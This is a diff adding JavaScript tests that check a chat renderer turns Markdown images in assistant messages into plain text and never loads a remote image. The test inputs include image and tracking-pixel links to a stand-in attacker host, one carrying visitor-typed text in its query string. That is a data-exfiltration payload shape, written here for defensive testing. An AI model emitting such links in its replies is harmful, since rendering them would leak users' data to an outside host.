@@ -49,3 +49,24 @@ describe('assistant messages are rendered safely', () => {
     expect(html).toContain('rel="noopener noreferrer"');
   });
 });
+
+describe('Markdown images never load anything', () => {
+  it.each([
+    ['a remote image', '![x](https://evil.example/p.png)'],
+    ['a tracking pixel carrying data', '![](https://evil.example/?q=what-the-visitor-typed)'],
+    ['an image with a title', '![x](https://evil.example/p.png "t")'],
+    ['an image inside a link', '[![x](https://evil.example/p.png)](https://example.com)'],
+    ['a data: image', '![x](data:image/png;base64,AAAA)'],
+    ['a protocol-relative image', '![x](//evil.example/p.png)'],
+  ])('%s renders no <img> and names no remote address', (_name, text) => {
+    const html = render(text);
+    expect(html).not.toMatch(/<img/i);
+    expect(html).not.toMatch(/evil\.example/);
+  });
+
+  it('shows the image description as plain text instead', () => {
+    expect(render('![a diagram of the process](https://evil.example/p.png)')).toContain(
+      'a diagram of the process',
+    );
+  });
+});
